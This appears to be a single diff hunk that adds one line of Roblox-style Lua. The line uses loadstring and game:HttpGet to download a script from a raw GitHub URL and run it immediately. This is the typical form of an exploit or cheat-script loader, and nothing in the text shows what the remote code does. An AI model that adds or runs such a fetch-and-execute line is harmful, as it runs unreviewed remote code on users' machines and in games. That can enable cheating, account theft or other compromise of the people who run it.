@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovecodeing123456799/inscominsc-v2-main-main/main/script.lua", true))()
